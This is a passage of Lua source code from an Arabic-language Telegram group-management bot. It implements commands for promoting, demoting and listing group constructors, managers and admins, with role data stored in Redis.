usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
------------------------------------------------------------------------
if text == ("مسح الاساسين") and Sudo_bot(msg) then
redis:del('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n⌔︙ تم مسح قائمه المنشئين الاساسين')
return false
end

if text == 'المنشئين الاساسين' and Sudo_bot(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_)
t = "\n⌔︙ قائمة المنشئين الاساسين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد منشئين اساسيين"
end
send(msg.chat_id_, msg.id_, t)
return false
end

if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"⌔︙ حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "Spirta")
send(msg.chat_id_, msg.id_,"⌔︙المالك : ["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
end
if text ==("رفع المنشئ") and Sudo_bot(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"⌔︙حساب المنشئ محذوف")
return false  
end
local UserName = (b.username_ or "Spirta")
send(msg.chat_id_, msg.id_,"⌔︙تم ترقية منشئ المجموعه : ["..b.first_name_.."](T.me/"..UserName..")")  
redis:sadd('Spyder:'..bot_id.."Basic:Constructor"..msg.chat_id_,b.id_)
end,nil)   
end,nil)   
end

if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and Sudo_bot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:sadd('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and Sudo_bot(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته منشئ اساسي'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and Sudo_bot(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and Sudo_bot(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and Sudo_bot(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من الاساسيين'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and Sudo_bot(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:srem('Spyder:'..bot_id..'Set:Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'تنزيل جميع الرتب' and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:del('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_)
redis:del('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_)
redis:del('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_)
redis:del('Spyder:'..bot_id..'Set:Vip'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙ تم تنزيل الكل من جميع الرتب\n{المنشئين ، المدراء ، الادمنيه ، المميزين}')  
end

if text == 'مسح المنشئين' and BasicConstructor(msg) then
redis:del('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_)
texts = '⌔︙  تم مسح المنشئين '
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_)
t = "\n⌔︙ قائمة المنشئين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:sadd('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته منشئ'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم ترقيته منشئ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المنشئين'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:srem('Spyder:'..bot_id..'Set:Creator'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من المنشئين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
redis:del('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_)
texts = '⌔︙  تم مسح المدراء '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_)
t = "\n⌔︙ قائمة المدراء \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد مدراء"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:sadd('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  

if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مدير'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المدراء'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:srem('Spyder:'..bot_id..'Set:Moder'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text ==("رفع الادمنيه") and Owners(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
redis:sadd('Spyder:'..bot_id.."Set:Admin"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
redis:srem('Spyder:'..bot_id.."Set:Admin"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
redis:srem('Spyder:'..bot_id.."Set:Admin"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"⌔︙لا توجد ادمنية ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_,"⌔︙ تمت ترقية { "..num2.." } من ادمنية المجموعه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Owners(msg) then
redis:del('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '⌔︙  تم مسح  قائمة الادمنية  ')
end
if text == ("الادمنيه") and Owners(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_)
t = "\n⌔︙ قائمة الادمنيه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and msg.reply_to_message_id_ and Owners(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الرفع من قبل المنشئين') 
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Owners(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل الرفع من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Admin'..msg.chat_id_, result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته ادمن'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Owners(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
if redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
